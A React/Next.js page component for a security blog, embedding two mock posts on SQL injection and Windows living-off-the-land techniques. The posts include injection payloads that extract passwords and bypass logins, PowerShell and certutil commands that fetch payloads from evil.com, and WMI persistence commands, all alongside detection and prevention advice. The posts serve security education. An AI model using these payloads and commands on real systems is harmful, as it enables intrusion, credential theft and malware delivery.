"use client"

import { useParams } from "next/navigation"
import Link from "next/link"
import { ChevronRight, Calendar, Clock, Tag, ArrowLeft, Share2, Shield, Target } from "lucide-react"
import { Button } from "@/components/ui/button"
import MatrixRain from "@/components/matrix-rain"

export default function BlogPostPage() {
  const params = useParams()
  const postId = params.id

  // Mock blog post data - in real app, this would come from a CMS or API
  const blogPosts = {
    "1": {
      id: 1,
      title: "Advanced SQL Injection Techniques in 2024",
      excerpt:
        "Exploring modern SQL injection vectors and bypass techniques that every penetration tester should know.",
      content: `
# Advanced SQL Injection Techniques in 2024

SQL injection remains one of the most critical web application vulnerabilities, consistently ranking in the OWASP Top 10. Despite increased awareness, many applications still fall victim to these attacks due to poor input validation and inadequate security measures.

## Understanding Modern SQL Injection

In 2024, attackers have evolved their techniques to bypass modern security controls including:

### 1. WAF Bypass Techniques
- **Encoding Variations**: Using different encoding methods (URL, HTML, Unicode)
- **Case Manipulation**: Mixing upper and lower case to evade pattern matching
- **Comment Insertion**: Strategic placement of SQL comments to break detection patterns

### 2. Time-Based Blind SQL Injection
When traditional error-based injection fails, time-based techniques become crucial:

\`\`\`sql
' OR IF(1=1, SLEEP(5), 0) --
\`\`\`

### 3. Boolean-Based Blind Injection
Extracting data bit by bit through true/false responses:

\`\`\`sql
' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
\`\`\`

## Advanced Exploitation Techniques

### Second-Order SQL Injection
This technique involves injecting malicious SQL that gets stored and executed later:

1. **Injection Phase**: Malicious payload is stored in the database
2. **Execution Phase**: Stored payload executes when data is retrieved

### NoSQL Injection
With the rise of NoSQL databases, new injection vectors have emerged:

\`\`\`javascript
{"username": {"$ne": null}, "password": {"$ne": null}}
\`\`\`

## Detection and Prevention

### Automated Detection Tools
- **SQLMap**: The gold standard for SQL injection testing
- **Burp Suite**: Professional web application security testing
- **OWASP ZAP**: Free and open-source security scanner

### Prevention Best Practices
1. **Parameterized Queries**: Always use prepared statements
2. **Input Validation**: Implement strict input validation
3. **Least Privilege**: Database users should have minimal permissions
4. **WAF Implementation**: Deploy and properly configure web application firewalls

## Conclusion

SQL injection continues to evolve, and security professionals must stay ahead of these techniques. Regular security testing, code reviews, and proper implementation of security controls are essential for protecting applications.

Remember: These techniques should only be used for authorized penetration testing and security research purposes.
      `,
      category: "penetration",
      date: "2024-01-15",
      readTime: "8 min",
      tags: ["SQL Injection", "Web Security", "OWASP"],
      icon: Shield,
      author: "CyberDevHq",
    },
    "2": {
      id: 2,
      title: "Red Team Tactics: Living Off The Land",
      excerpt: "How to use legitimate system tools for malicious purposes during red team engagements.",
      content: `
# Red Team Tactics: Living Off The Land

Living off the Land (LOLBAS - Living Off The Land Binaries and Scripts) is a technique where attackers use legitimate system tools and processes to carry out malicious activities. This approach helps evade detection by blending in with normal system behavior.

## Why Living Off The Land?

### Advantages for Red Teams:
- **Stealth**: Uses legitimate system processes
- **Evasion**: Bypasses traditional antivirus detection
- **Persistence**: Leverages trusted system binaries
- **Minimal Footprint**: No need to drop custom tools

## Common LOLBAS Techniques

### PowerShell Exploitation
PowerShell is a powerful tool for red team operations:

\`\`\`powershell
# Download and execute payload
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# Encoded command execution
powershell -EncodedCommand <base64_encoded_command>
\`\`\`

### WMI (Windows Management Instrumentation)
WMI can be used for lateral movement and persistence:

\`\`\`powershell
# Remote command execution
wmic /node:"target" process call create "cmd.exe /c whoami"

# Event subscription for persistence
wmic /namespace:"\\\\root\\subscription" path __EventFilter create Name="MyFilter", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
\`\`\`

### Certutil Abuse
Certutil can be used for file downloads and encoding:

\`\`\`cmd
# Download files
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# Encode/decode files
certutil -encode payload.exe encoded.txt
\`\`\`

## Advanced Techniques

### Process Hollowing
Injecting malicious code into legitimate processes:

1. **Create Suspended Process**: Start legitimate process in suspended state
2. **Hollow Process**: Replace process memory with malicious code
3. **Resume Execution**: Resume process with malicious payload

### DLL Side-Loading
Exploiting DLL search order to load malicious libraries:

1. **Identify Target**: Find application that loads DLLs
2. **Create Malicious DLL**: Develop DLL with same name as legitimate one
3. **Place DLL**: Position malicious DLL in search path

## Detection and Mitigation

### Detection Strategies:
- **Behavioral Analysis**: Monitor for unusual process behavior
- **Command Line Monitoring**: Track command line arguments
- **Network Monitoring**: Watch for suspicious network connections
- **PowerShell Logging**: Enable detailed PowerShell logging

### Mitigation Techniques:
- **Application Whitelisting**: Only allow approved applications
- **PowerShell Constrained Language Mode**: Restrict PowerShell functionality
- **WMI Monitoring**: Monitor WMI activity for suspicious behavior
- **Endpoint Detection and Response (EDR)**: Deploy advanced endpoint protection

## Conclusion

Living off the land techniques are powerful tools in a red team's arsenal. Understanding these methods is crucial for both offensive and defensive security professionals. Blue teams must be aware of these techniques to develop effective detection and mitigation strategies.

*Disclaimer: These techniques should only be used in authorized penetration testing and red team exercises.*
      `,
      category: "redteam",
      date: "2024-01-10",
      readTime: "12 min",
      tags: ["Red Team", "LOLBAS", "Post-Exploitation"],
      icon: Target,
      author: "CyberDevHq",
    },
  }

  const post = blogPosts[postId as keyof typeof blogPosts]

  if (!post) {
    return (
      <div className="min-h-screen bg-black text-green-400 font-mono relative">
        <MatrixRain />
        <div className="flex items-center justify-center min-h-screen relative z-10">
          <div className="text-center">
            <h1 className="text-4xl font-bold mb-4">404 - Post Not Found</h1>
            <p className="text-green-300 mb-6">The requested blog post could not be found.</p>
            <Button asChild className="bg-green-400 text-black hover:bg-green-300">
              <Link href="/blog">
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back to Blog
              </Link>
            </Button>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-black text-green-400 font-mono relative">
      <MatrixRain />

      {/* Navigation */}
      <nav className="border-b border-green-400/30 p-4 relative z-10 bg-black/80 backdrop-blur-sm">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center space-x-2">
            <ChevronRight className="w-6 h-6 text-green-400" />
            <Link href="/" className="text-xl font-bold">
              CyberDevHq
            </Link>
          </div>
          <div className="hidden md:flex space-x-6">
            <Link href="/" className="hover:text-green-300 transition-colors">
              Home
            </Link>
            <Link href="/about" className="hover:text-green-300 transition-colors">
              About
            </Link>
            <Link href="/skills" className="hover:text-green-300 transition-colors">
              Skills
            </Link>
            <Link href="/projects" className="hover:text-green-300 transition-colors">
              Projects
            </Link>
            <Link href="/services" className="hover:text-green-300 transition-colors">
              Services
            </Link>
            <Link href="/terminal" className="hover:text-green-300 transition-colors">
              Terminal
            </Link>
            <Link href="/contact" className="hover:text-green-300 transition-colors">
              Contact
            </Link>
            <Link href="/blog" className="text-green-300">
              Blog
            </Link>
          </div>
        </div>
      </nav>

      <main className="max-w-4xl mx-auto px-4 py-12 relative z-10">
        {/* Back Button */}
        <div className="mb-8">
          <Button
            asChild
            variant="outline"
            className="border-green-400 text-green-400 hover:bg-green-400 hover:text-black bg-transparent"
          >
            <Link href="/blog">
              <ArrowLeft className="w-4 h-4 mr-2" />
              Back to Blog
            </Link>
          </Button>
        </div>

        {/* Article Header */}
        <article className="border border-green-400/50 bg-black/60 backdrop-blur-sm">
          <div className="p-8">
            <div className="flex items-center mb-4">
              <post.icon className="w-6 h-6 mr-2" />
              <span className="text-sm text-green-300 capitalize">{post.category}</span>
            </div>

            <h1 className="text-3xl md:text-4xl font-bold mb-4">{post.title}</h1>
            <p className="text-green-300 text-lg mb-6">{post.excerpt}</p>

            <div className="flex items-center justify-between border-b border-green-400/30 pb-6 mb-8">
              <div className="flex items-center space-x-6 text-sm text-green-300">
                <span className="flex items-center">
                  <Calendar className="w-4 h-4 mr-1" />
                  {new Date(post.date).toLocaleDateString()}
                </span>
                <span className="flex items-center">
                  <Clock className="w-4 h-4 mr-1" />
                  {post.readTime}
                </span>
                <span>By {post.author}</span>
              </div>
              <Button
                size="sm"
                variant="outline"
                className="border-green-400 text-green-400 hover:bg-green-400 hover:text-black bg-transparent"
              >
                <Share2 className="w-4 h-4 mr-1" />
                Share
              </Button>
            </div>

            {/* Tags */}
            <div className="flex flex-wrap gap-2 mb-8">
              {post.tags.map((tag, index) => (
                <span
                  key={index}
                  className="text-sm bg-green-400/10 text-green-300 px-3 py-1 border border-green-400/30 flex items-center"
                >
                  <Tag className="w-3 h-3 mr-1" />
                  {tag}
                </span>
              ))}
            </div>

            {/* Article Content */}
            <div className="prose prose-green max-w-none">
              <div className="text-green-300 leading-relaxed whitespace-pre-line">{post.content}</div>
            </div>
          </div>
        </article>

        {/* Related Posts */}
        <div className="mt-12 border border-green-400/50 p-8 bg-black/60 backdrop-blur-sm">
          <h2 className="text-2xl font-bold mb-6">Related Articles</h2>
          <div className="grid md:grid-cols-2 gap-6">
            <div className="border border-green-400/30 p-4">
              <h3 className="font-bold mb-2">OWASP Top 10 2024: What's New?</h3>
              <p className="text-green-300 text-sm mb-3">
                Analysis of the latest OWASP Top 10 vulnerabilities and testing methods.
              </p>
              <Button
                size="sm"
                variant="outline"
                className="border-green-400 text-green-400 hover:bg-green-400 hover:text-black bg-transparent"
              >
                Read More
              </Button>
            </div>
            <div className="border border-green-400/30 p-4">
              <h3 className="font-bold mb-2">Building a Home Cyber Range</h3>
              <p className="text-green-300 text-sm mb-3">
                Complete guide to setting up your own cybersecurity lab for practice.
              </p>
              <Button
                size="sm"
                variant="outline"
                className="border-green-400 text-green-400 hover:bg-green-400 hover:text-black bg-transparent"
              >
                Read More
              </Button>
            </div>
          </div>
        </div>
      </main>
    </div>
  )
}
